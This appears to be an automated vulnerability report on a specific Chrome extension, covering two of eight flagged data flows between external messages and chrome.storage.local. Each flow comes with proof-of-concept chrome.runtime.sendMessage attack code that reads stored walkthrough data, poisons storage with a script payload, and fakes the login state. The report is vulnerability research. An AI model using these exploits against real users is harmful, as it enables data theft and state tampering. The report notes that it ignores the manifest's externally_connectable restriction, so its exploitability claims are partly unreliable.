# CoCo Analysis: omndidnkokehfibgabejhahadcckicch

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8

---

## Sink 1: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/omndidnkokehfibgabejhahadcckicch/opgen_generated_files/bg.js
Line 751	var storage_local_get_source = { 'key': 'value' };
Line 1432	if(!result.walkthroughDataToSave)
Line 1437	if (result.walkthroughDataToSave.data.readyToSave)

**Code:**

```javascript
// Background script (bg.js) - Lines 1406-1444
chrome.runtime.onMessageExternal.addListener(  // ← External websites can trigger
  (message, sender, sendResponse) => {
    if (message.type == "isThereWalkthroughDataToBeSaved") {
      chrome.storage.local.get(["walkthroughDataToSave"], function (result) {
        if(!result.walkthroughDataToSave){
          return;
        }
        if (result.walkthroughDataToSave.data.readyToSave) {
          sendResponse({  // ← Sends storage data back to external caller
            type: "success",
            data: result  // ← attacker receives stored data
          });
        }
      });
      return true;
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any website (even though manifest has externally_connectable restriction,
// we IGNORE it per methodology rule #1)
chrome.runtime.sendMessage(
  'omndidnkokehfibgabejhahadcckicch',  // extension ID
  { type: "isThereWalkthroughDataToBeSaved" },
  function(response) {
    console.log("Stolen data:", response.data);  // ← attacker receives stored walkthrough data
  }
);
```

**Impact:** Information disclosure - external websites can read stored walkthrough data from chrome.storage.local via sendResponse.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/omndidnkokehfibgabejhahadcckicch/opgen_generated_files/bg.js
Line 1450	message.walkthroughDataToSave.data.readyToSave = false
Line 1451	chrome.storage.local.set({ walkthroughDataToSave: message.walkthroughDataToSave }, ...)

**Code:**

```javascript
// Background script (bg.js) - Lines 1447-1458
chrome.runtime.onMessageExternal.addListener(  // ← External websites can trigger
  (message, sender, sendResponse) => {
    if (message.type == "walkthroughSaved") {
      console.log("message ->>>>",message);
      message.walkthroughDataToSave.data.readyToSave = false  // ← attacker-controlled
      chrome.storage.local.set({
        walkthroughDataToSave: message.walkthroughDataToSave  // ← attacker-controlled data stored
      }, function () {
        sendResponse({
          type: "success",
        });
      });
      return true;
    } else if (message.type == "UserisLoggedIn") {
      chrome.storage.local.set({ isUserLoggedIn: true }, function () {  // ← attacker controls boolean
        sendResponse({
          type: "success",
        });
      });
      return true;
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any website - Complete storage exploitation chain
// Step 1: Poison storage with malicious data
chrome.runtime.sendMessage(
  'omndidnkokehfibgabejhahadcckicch',
  {
    type: "walkthroughSaved",
    walkthroughDataToSave: {
      data: {
        readyToSave: true,  // ← set to true so attacker can retrieve it
        maliciousPayload: "<script>alert('XSS')</script>"  // ← attacker-controlled data
      }
    }
  },
  function(response) {
    console.log("Poisoned storage");

    // Step 2: Retrieve poisoned data
    chrome.runtime.sendMessage(
      'omndidnkokehfibgabejhahadcckicch',
      { type: "isThereWalkthroughDataToBeSaved" },
      function(response) {
        console.log("Retrieved poisoned data:", response.data);  // ← attacker retrieves own data
      }
    );
  }
);

// Also: Set fake login status
chrome.runtime.sendMessage(
  'omndidnkokehfibgabejhahadcckicch',
  { type: "UserisLoggedIn", userId: "attacker123" },
  function(response) {
    console.log("Set fake login status");
  }
);
```

**Impact:** Complete storage exploitation chain - external websites can write arbitrary data to chrome.storage.local and retrieve it back, achieving both storage poisoning and information disclosure. Attacker can also manipulate the isUserLoggedIn state.
